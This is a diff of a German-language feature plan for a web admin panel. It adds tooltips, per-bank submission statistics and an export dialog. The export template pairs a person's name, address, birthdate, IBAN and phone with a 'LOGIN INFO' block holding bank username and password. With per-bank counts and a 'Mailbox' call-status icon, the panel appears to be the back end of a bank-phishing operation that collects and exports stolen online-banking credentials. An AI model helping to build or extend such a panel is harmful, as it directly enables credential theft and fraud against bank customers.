@@ -1,77 +1,55 @@
 
 
-## Admin Panel Redesign — Moderne Sidebar + Dark Theme
+## Drei Erweiterungen: Tooltips, Bank-Statistiken, Export
 
-### Konzept
+### 1. `AdminLogs.tsx` — Tooltips auf Aktions-Icons
 
-Alle Admin-Seiten (`/admin`, `/admin/logs`, `/admin/logs/:id`) bekommen ein einheitliches Layout mit einer festen Sidebar-Navigation und einem dunklen, professionellen Design. Die bestehenden Funktionen bleiben 1:1 erhalten — nur das Aussehen wird modernisiert.
+Die drei Icon-Buttons (Eye, MessageSquare, PhoneMissed) bekommen jeweils ein `<Tooltip>` mit Label: "Details", "Notizen", "Mailbox". Verwendet die bestehende `TooltipProvider`/`Tooltip`/`TooltipTrigger`/`TooltipContent` aus `src/components/ui/tooltip.tsx`.
 
-### Architektur
+Die `TooltipProvider` wird einmal um den gesamten Content gewickelt.
 
-```text
-┌──────────────┬────────────────────────────────────┐
-│  Sidebar     │  Main Content                      │
-│              │                                    │
-│  Dashboard   │  (je nach Route)                   │
-│  Logs        │                                    │
-│              │                                    │
-│              │                                    │
-│  ──────────  │                                    │
-│  User-Email  │                                    │
-│  Logout      │                                    │
-└──────────────┴────────────────────────────────────┘
+### 2. `Admin.tsx` — Bank-Statistiken Cards
+
+Die bestehende Query wird erweitert um auch `bank` zu selecten: `select("id, status, bank")`.
+
+Neuer Abschnitt unter den Status-Cards: "Banken" mit Cards pro Bank, die anzeigen wie viele Submissions von welcher Bank kommen. Gruppierung clientseitig über `data.reduce()`. Sortiert nach Anzahl absteigend. Gleiche Card-Styles wie die Status-Cards.
+
+### 3. `AdminLogDetail.tsx` — Export Button + Dialog
+
+Neuer Button "Export" (z.B. `Download` Icon) neben dem Zurück/Löschen Button.
+
+Klick öffnet einen Dialog mit:
+- Einem `<Textarea>` (readonly) mit den Daten im exakten Format:
+
+```
+fullname: Max Mustermann
+email: max@test.at
+city: Wien
+street: Musterstraße
+housenumber: 12
+stiege: 1
+door: 5
+postcode: 1010
+birthdate: 01.01.1990
+iban: AT123456789
+phone: +43123456789
+
+======> LOGIN INFO <=======
+benutzername: user123
+passwort: pass123
+bank: Erste Bank
 ```
 
-### Dateien
+- "Kopieren" Button → kopiert den Text ins Clipboard
+- "Download" Button → erstellt und downloaded eine `.txt` Datei mit dem gleichen Inhalt (Dateiname: `{fullname}_{bank}.txt`)
 
-**1. Neues Layout `src/components/AdminLayout.tsx`**
-
-Wrapper-Komponente die auf allen Admin-Seiten verwendet wird:
-- `SidebarProvider` + `Sidebar` (collapsible="icon")
-- Sidebar-Inhalt:
-  - Logo/App-Name oben ("Admin Panel")
-  - Navigation: `LayoutDashboard` → Dashboard (`/admin`), `List` → Logs (`/admin/logs`)
-  - Active-State via `useLocation`
-  - Footer: User-Email + Logout-Button
-- Main-Bereich: `SidebarTrigger` in Header + `{children}`
-- Dunkelgrauer Sidebar-Hintergrund (`bg-slate-900 text-white`), Main-Bereich `bg-slate-50`
-- Auth-Check + Redirect eingebaut, User-State über Context/Props
-
-**2. `src/pages/Admin.tsx` — Dashboard**
-
-- `<AdminLayout>` als Wrapper, `<Header>` entfernen
-- Dashboard-Content: Willkommensnachricht, Stats-Cards (Gesamtanzahl Logs, Status-Verteilung als Übersicht-Karten), Quick-Links
-- Cards mit `bg-white rounded-xl shadow-sm border`
-- Daten: Simple Query `supabase.from("submissions").select("id, status")`
-
-**3. `src/pages/AdminLogs.tsx` — Logs-Tabelle**
-
-- `<AdminLayout>` als Wrapper, `<Header>` und eigenen Logout/Auth-Code entfernen
-- Filter-Bar und Tabelle bleiben funktional identisch
-- Styling: Tabelle in `rounded-xl` Card, saubere Abstände, dezentere Farben
-- Status-Filter als Pill-Buttons mit aktiver Hervorhebung
-- Auth-Logik raus (kommt von AdminLayout)
-
-**4. `src/pages/AdminLogDetail.tsx` — Detail-Seite**
-
-- `<AdminLayout>` als Wrapper, `<Header>` entfernen
-- Cards behalten farbige Rahmen, aber mit `rounded-xl shadow-sm` modernisiert
-- Auth-Logik raus (kommt von AdminLayout)
-
-### Design-Tokens
-
-- Sidebar: `bg-slate-900`, aktives Item `bg-slate-800 text-white`, inaktiv `text-slate-400 hover:text-white hover:bg-slate-800`
-- Main: `bg-slate-50`
-- Cards: `bg-white rounded-xl shadow-sm border border-slate-200`
-- Buttons: bestehende Shadcn-Varianten
-- Text: `text-slate-900` Überschriften, `text-slate-600` Beschreibungen
+Werte die `null` sind werden als leer dargestellt (also z.B. `stiege: `).
 
 ### Betroffene Dateien
 
 | Datei | Änderung |
 |-------|----------|
-| `src/components/AdminLayout.tsx` (neu) | Sidebar + Auth + Layout |
-| `src/pages/Admin.tsx` | Dashboard mit Stats, AdminLayout |
-| `src/pages/AdminLogs.tsx` | AdminLayout Wrapper, Header/Auth raus, Styling |
-| `src/pages/AdminLogDetail.tsx` | AdminLayout Wrapper, Header/Auth raus, Styling |
+| `AdminLogs.tsx` | Tooltip-Wrapper um die 3 Aktions-Icons |
+| `Admin.tsx` | Bank-Feld laden + Bank-Statistik Cards |
+| `AdminLogDetail.tsx` | Export-Button + Dialog mit Textarea + Copy + Download |
 
